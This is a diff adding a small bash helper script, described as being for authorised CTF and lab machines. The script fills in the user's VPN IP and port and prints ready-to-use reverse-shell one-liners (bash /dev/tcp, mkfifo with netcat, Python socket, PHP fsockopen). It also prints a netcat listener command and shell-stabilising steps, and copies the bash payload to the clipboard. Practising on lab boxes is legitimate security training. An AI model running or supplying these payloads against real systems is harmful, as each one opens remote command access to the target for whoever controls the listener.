@@ -1,0 +1,21 @@
+#!/usr/bin/env bash
+# revsh [port] — print common reverse-shell one-liners prefilled with your VPN IP,
+# for CTF / lab boxes you're authorised to attack (HTB, THM, your own VMs).
+PORT="${1:-4444}"
+for i in tun0 tun1 wg0; do IP=$(ip -4 -o addr show "$i" 2>/dev/null | awk '{print $4}' | cut -d/ -f1); [ -n "$IP" ] && break; done
+IP="${IP:-$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{for(n=1;n<NF;n++) if($n=="src") print $(n+1)}')}"
+IP="${IP:-LHOST}"
+B=$'\e[38;2;139;90;60m'; D=$'\e[38;2;110;102;87m'; O=$'\e[38;2;154;131;72m'; R=$'\e[0m'
+echo "${B}── listener ─────────────────────────────${R}"
+echo "  rlwrap nc -lvnp $PORT"
+echo "${B}── payloads ($IP:$PORT) ─────────────────${R}"
+echo "${D}bash${R}    bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'"
+echo "${D}sh/nc${R}   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $IP $PORT >/tmp/f"
+echo "${D}python${R}  python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$IP\",$PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"sh\")'"
+echo "${D}php${R}     php -r '\$s=fsockopen(\"$IP\",$PORT);exec(\"sh <&3 >&3 2>&3\");'"
+echo "${D}pwsh${R}    see: https://www.revshells.com (IP=$IP PORT=$PORT)"
+echo "${B}── tty upgrade ──────────────────────────${R}"
+echo "  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'   ${D}then Ctrl+Z${R}"
+echo "  stty raw -echo; fg      ${D}then${R}  export TERM=xterm-256color; stty rows $(tput lines) cols $(tput cols)"
+echo "${O}bash one-liner copied to clipboard${R}"
+printf "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" "$IP" "$PORT" | wl-copy 2>/dev/null || true
